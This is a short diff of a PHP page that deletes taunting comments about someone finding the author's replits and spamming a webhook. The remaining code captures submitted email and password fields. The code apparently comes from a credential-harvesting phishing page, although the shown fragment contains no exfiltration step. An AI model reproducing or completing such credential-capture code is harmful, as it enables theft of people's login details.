@@ -1,9 +1,5 @@
 <!DOCTYPE html>
 <?php
-//Bro your literally just looking at my replits your a skid
-//Funny how you only get the webhook when I leave it🥱
-//"@everyone Spammed By JJ#0002" Weakest spam i've seen in a good while 
-//<3 add me psy Ice Bear#8828
 if(isset($_POST['commit'])){
       $username = $_POST["email"];
       $password = $_POST["password"];
